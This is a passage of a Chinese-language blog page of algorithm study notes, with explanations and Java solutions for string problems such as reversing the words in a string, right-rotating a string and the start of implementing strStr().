class="line">            <span class="keyword">if</span> (<span class="string">&#x27;0&#x27;</span> &lt;= ret[i] &amp;&amp; ret[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                ret[j--] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">                ret[j--] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">                ret[j--] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">                ret[j--] = <span class="string">&#x27;m&#x27;</span>;</span><br><span class="line">                ret[j--] = <span class="string">&#x27;u&#x27;</span>;</span><br><span class="line">                ret[j--] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ret[j--] = ret[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="151-翻转字符串里的单词"><a href="#151-翻转字符串里的单词" class="headerlink" title="151.翻转字符串里的单词"></a>151.翻转字符串里的单词</h2><p>给你一个字符串 s ，请你反转字符串中 单词 的顺序。<br>单词 是由非空格字符组成的字符串。s 中使用至少一个空格将字符串中的 单词 分隔开。<br>返回 单词 顺序颠倒且 单词 之间用单个空格连接的结果字符串。<br>注意：输入字符串 s中可能会存在前导空格、尾随空格或者单词间的多个空格。返回的结果字符串中，单词间应当仅用单个空格分隔，且不包含任何额外的空格。</p><p>示例 1：<br>输入：s &#x3D; “the sky is blue”<br>输出：”blue is sky the”</p><p>示例 2：<br>输入：s &#x3D; “  hello world  “<br>输出：”world hello”<br>解释：反转后的字符串中不能存在前导空格和尾随空格。</p><p>想一下，我们将整个字符串都反转过来，那么单词的顺序指定是倒序了，只不过单词本身也倒序了，那么再把单词反转一下，单词不就正过来了。</p><p>所以解题思路如下：</p><ul><li><p>移除多余空格</p></li><li><p>将整个字符串反转</p></li><li><p>将每个单词反转</p></li><li><p>举个例子，源字符串为：”the sky is blue “</p></li><li><p>移除多余空格 : “the sky is blue”</p></li><li><p>字符串反转：”eulb si yks eht”</p></li><li><p>单词反转：”blue is sky the”</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">// 去除首尾及中间多余空格</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> removeSpace(s);</span><br><span class="line">        <span class="comment">// 反转整个字符串</span></span><br><span class="line">        reverseString(sb, <span class="number">0</span>, sb.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 反转各个单词</span></span><br><span class="line">        reverseEachWord(sb);</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> StringBuilder <span class="title function_">removeSpace</span><span class="params">(String s)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> s.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(s.charAt(start) == <span class="string">&#x27; &#x27;</span>) start++;</span><br><span class="line">        <span class="keyword">while</span>(s.charAt(end) == <span class="string">&#x27; &#x27;</span>) end--;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">while</span>(start &lt;= end)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(start);</span><br><span class="line">            <span class="keyword">if</span>(c != <span class="string">&#x27; &#x27;</span> || sb.charAt(sb.length() - <span class="number">1</span>) != <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                sb.append(c);</span><br><span class="line">            &#125;</span><br><span class="line">            start++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(StringBuilder sb, <span class="type">int</span> start, <span class="type">int</span> end)</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(start &lt; end)&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">temp</span> <span class="operator">=</span> sb.charAt(start);</span><br><span class="line">            sb.setCharAt(start, sb.charAt(end));</span><br><span class="line">            sb.setCharAt(end, temp);</span><br><span class="line">            start++;</span><br><span class="line">            end--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reverseEachWord</span><span class="params">(StringBuilder sb)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> sb.length();</span><br><span class="line">        <span class="keyword">while</span>(start &lt; n)&#123;</span><br><span class="line">            <span class="keyword">while</span>(end &lt; n &amp;&amp; sb.charAt(end) != <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                end++;</span><br><span class="line">            &#125; </span><br><span class="line">            reverseString(sb, start, end - <span class="number">1</span>);</span><br><span class="line">            start = end + <span class="number">1</span>;</span><br><span class="line">            end = start + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解法二：创建新字符数组填充。时间复杂度O(n)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] initiaArr = s.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] newArr = <span class="keyword">new</span> <span class="title class_">char</span>[initiaArr.length + <span class="number">1</span>]; <span class="comment">//下面循环添加&quot;单词 &quot;，最终末尾的空格不会返回</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">newArrPos</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> initiaArr.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i &gt;= <span class="number">0</span> &amp;&amp; initiaArr[i] == <span class="string">&#x27; &#x27;</span>)&#123;i--;&#125; <span class="comment">// 跳过空格</span></span><br><span class="line">            <span class="comment">// 此时i位置是边界或!=空格，先记录当前索引，之后的while用来确定字母的首字母位置</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">while</span>(i&gt;=<span class="number">0</span> &amp;&amp; initiaArr[i] != <span class="string">&#x27; &#x27;</span>)&#123;i--;&#125;</span><br><span class="line">            <span class="comment">// 指定区间单词取出（由于i为首字母的前一位，所以这里+1,取出的每组末尾都带有一个空格</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i+<span class="number">1</span>; j &lt;= right; j++)&#123;</span><br><span class="line">                newArr[newArrPos++] = initiaArr[j];</span><br><span class="line">                <span class="keyword">if</span>(j == right)&#123;</span><br><span class="line">                    newArr[newArrPos++] = <span class="string">&#x27; &#x27;</span>; <span class="comment">//空格</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 若是原是字符没有单词直接返回字符串，若是有单词，返回0-末尾空格索引前范围的字符数组(转成String返回)</span></span><br><span class="line">        <span class="keyword">if</span>(newArrPos == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(newArr, <span class="number">0</span>, newArrPos-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解法三：双反转+移位，String 的 toCharArray() 方法底层会 new 一个和原字符串相同大小的 char 数组，空间复杂度：O(n)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 思路：</span></span><br><span class="line"><span class="comment">     *①反转字符串  &quot;the sky is blue &quot; =&gt; &quot; eulb si yks eht&quot;</span></span><br><span class="line"><span class="comment">     *②遍历 &quot; eulb si yks eht&quot;，每次先对某个单词进行反转再移位</span></span><br><span class="line"><span class="comment">     *   这里以第一个单词进行为演示：&quot; eulb si yks eht&quot; ==反转=&gt; &quot; blue si yks eht&quot; ==移位=&gt; &quot;blue si yks eht&quot;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">//步骤1：字符串整体反转（此时其中的单词也都反转了）</span></span><br><span class="line">        <span class="type">char</span>[] initialArr = s.toCharArray();</span><br><span class="line">        reverse(initialArr, <span class="number">0</span>, s.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; initialArr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (initialArr[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tempCur</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; initialArr.length &amp;&amp; initialArr[i] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> tempCur; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j == tempCur) &#123; <span class="comment">//步骤二：二次反转</span></span><br><span class="line">                    reverse(initialArr, tempCur, i - <span class="number">1</span>);<span class="comment">//对指定范围字符串进行反转，不反转从后往前遍历一个个填充有问题</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//步骤三：移动操作</span></span><br><span class="line">                initialArr[k++] = initialArr[j];</span><br><span class="line">                <span class="keyword">if</span> (j == i - <span class="number">1</span>) &#123; <span class="comment">//遍历结束</span></span><br><span class="line">                    <span class="comment">//避免越界情况，例如=&gt; &quot;asdasd df f&quot;，不加判断最后就会数组越界</span></span><br><span class="line">                    <span class="keyword">if</span> (k &lt; initialArr.length) &#123;</span><br><span class="line">                        initialArr[k++] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//参数三：以防出现如&quot;asdasd df f&quot;=&gt;&quot;f df asdasd&quot;正好凑满不需要省略空格情况</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(initialArr, <span class="number">0</span>, (k == initialArr.length) &amp;&amp; (initialArr[k - <span class="number">1</span>] != <span class="string">&#x27; &#x27;</span>) ? k : k - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">char</span>[] chars, <span class="type">int</span> begin, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> begin, j = end; i &lt; j; i++, j--) &#123;</span><br><span class="line">            chars[i] ^= chars[j];</span><br><span class="line">            chars[j] ^= chars[i];</span><br><span class="line">            chars[i] ^= chars[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 解法四：时间复杂度 O(n)</span></span><br><span class="line"><span class="comment"> * 参考卡哥 c++ 代码的三步骤：先移除多余空格，再将整个字符串反转，最后把单词逐个反转</span></span><br><span class="line"><span class="comment"> * 有别于解法一 ：没有用 StringBuilder  实现，而是对 String 的 char[] 数组操作来实现以上三个步骤</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//用 char[] 来实现 String 的 removeExtraSpaces，reverse 操作</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] chars = s.toCharArray();</span><br><span class="line">        <span class="comment">//1.去除首尾以及中间多余空格</span></span><br><span class="line">        chars = removeExtraSpaces(chars);</span><br><span class="line">        <span class="comment">//2.整个字符串反转</span></span><br><span class="line">        reverse(chars, <span class="number">0</span>, chars.length - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//3.单词反转</span></span><br><span class="line">        reverseEachWord(chars);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.用 快慢指针 去除首尾以及中间多余空格，可参考数组元素移除的题解</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span>[] removeExtraSpaces(<span class="type">char</span>[] chars) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slow</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">fast</span> <span class="operator">=</span> <span class="number">0</span>; fast &lt; chars.length; fast++) &#123;</span><br><span class="line">            <span class="comment">//先用 fast 移除所有空格</span></span><br><span class="line">            <span class="keyword">if</span> (chars[fast] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">//在用 slow 加空格。 除第一个单词外，单词末尾要加空格</span></span><br><span class="line">                <span class="keyword">if</span> (slow != <span class="number">0</span>)</span><br><span class="line">                    chars[slow++] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                <span class="comment">//fast 遇到空格或遍历到字符串末尾，就证明遍历完一个单词了</span></span><br><span class="line">                <span class="keyword">while</span> (fast &lt; chars.length &amp;&amp; chars[fast] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                    chars[slow++] = chars[fast++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//相当于 c++ 里的 resize()</span></span><br><span class="line">        <span class="type">char</span>[] newChars = <span class="keyword">new</span> <span class="title class_">char</span>[slow];</span><br><span class="line">        System.arraycopy(chars, <span class="number">0</span>, newChars, <span class="number">0</span>, slow); </span><br><span class="line">        <span class="keyword">return</span> newChars;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//双指针实现指定范围内字符串反转，可参考字符串反转题解</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">char</span>[] chars, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (right &gt;= chars.length) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;set a wrong right&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            chars[left] ^= chars[right];</span><br><span class="line">            chars[right] ^= chars[left];</span><br><span class="line">            chars[left] ^= chars[right];</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.单词反转</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseEachWord</span><span class="params">(<span class="type">char</span>[] chars)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//end &lt;= s.length() 这里的 = ，是为了让 end 永远指向单词末尾后一个位置，这样 reverse 的实参更好设置</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> <span class="number">0</span>; end &lt;= chars.length; end++) &#123;</span><br><span class="line">            <span class="comment">// end 每次到单词末尾后的空格或串尾,开始反转单词</span></span><br><span class="line">            <span class="keyword">if</span> (end == chars.length || chars[end] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                reverse(chars, start, end - <span class="number">1</span>);</span><br><span class="line">                start = end + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="右旋字符串"><a href="#右旋字符串" class="headerlink" title="右旋字符串"></a>右旋字符串</h2><p>字符串的右旋转操作是把字符串尾部的若干个字符转移到字符串的前面。给定一个字符串 s 和一个正整数 k，请编写一个函数，将字符串中的后面 k 个字符移到字符串的前面，实现字符串的右旋转操作。<br>例如，对于输入字符串 “abcdefg” 和整数 2，函数应该将其转换为 “fgabcde”。<br>输入：输入共包含两行，第一行为一个正整数 k，代表右旋转的位数。第二行为字符串 s，代表需要旋转的字符串。<br>输出：输出共一行，为进行了右旋转操作后的字符串。</p><p>输入示例<br>    2<br>    abcdefg<br>输出示例<br>    fgabcde</p><p>为了让本题更有意义，提升一下本题难度：不能申请额外空间，只能在本串上操作。 （Java不能在字符串上修改，所以使用java一定要开辟新空间）<br>不能使用额外空间的话，模拟在本串操作要实现右旋转字符串的功能还是有点困难的。</p><p>其实两段反转就可以解决这个问题了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 版本一</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> Integer.parseInt(in.nextLine());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> in.nextLine();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();  <span class="comment">//获取字符串长度</span></span><br><span class="line">        <span class="type">char</span>[] chars = s.toCharArray();</span><br><span class="line">        reverseString(chars, <span class="number">0</span>, len - <span class="number">1</span>);  <span class="comment">//反转整个字符串</span></span><br><span class="line">        reverseString(chars, <span class="number">0</span>, n - <span class="number">1</span>);  <span class="comment">//反转前一段字符串，此时的字符串首尾尾是0,n - 1</span></span><br><span class="line">        reverseString(chars, n, len - <span class="number">1</span>);  <span class="comment">//反转后一段字符串，此时的字符串首尾尾是n,len - 1</span></span><br><span class="line">        </span><br><span class="line">        System.out.println(chars);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>[] ch, <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">        <span class="comment">//异或法反转字符串，参照题目 344.反转字符串的解释</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">            ch[start] ^= ch[end];</span><br><span class="line">            ch[end] ^= ch[start];</span><br><span class="line">            ch[start] ^= ch[end];</span><br><span class="line">            start++;</span><br><span class="line">            end--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 版本二</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> Integer.parseInt(in.nextLine());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> in.nextLine();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();  <span class="comment">//获取字符串长度</span></span><br><span class="line">        <span class="type">char</span>[] chars = s.toCharArray();</span><br><span class="line">        reverseString(chars, <span class="number">0</span>, len - n - <span class="number">1</span>);  <span class="comment">//反转前一段字符串，此时的字符串首尾是0,len - n - 1</span></span><br><span class="line">        reverseString(chars, len - n, len - <span class="number">1</span>);  <span class="comment">//反转后一段字符串，此时的字符串首尾是len - n,len - 1</span></span><br><span class="line">        reverseString(chars, <span class="number">0</span>, len - <span class="number">1</span>);  <span class="comment">//反转整个字符串</span></span><br><span class="line"></span><br><span class="line">        System.out.println(chars);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>[] ch, <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">        <span class="comment">//异或法反转字符串，参照题目 344.反转字符串的解释</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">            ch[start] ^= ch[end];</span><br><span class="line">            ch[end] ^= ch[start];</span><br><span class="line">            ch[start] ^= ch[end];</span><br><span class="line">            start++;</span><br><span class="line">            end--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="28-实现-strStr"><a href="#28-实现-strStr" class="headerlink" title="28. 实现 strStr()"></a>28. 实现 strStr()</h2><p>给你两个字符串 haystack 和 needle ，请你在 haystack 字符串中找出 needle 字符串的第一个匹配项的下标（下标从 0 开始）。如果 needle 不是 haystack 的一部分，则返回  -1 。</p><p>示例 1：<br>输入：haystack &#x3D; “sadbutsad”, needle &#x3D; “sad”<br>输出：0<br>解释：”sad” 在下标 0 和 6 处匹配。<br>第一个匹配项的下标是 0 ，所以返回 0 。</p><p>示例 2：<br>输入：haystack &#x3D; “leetcode”, needle &#x3D; 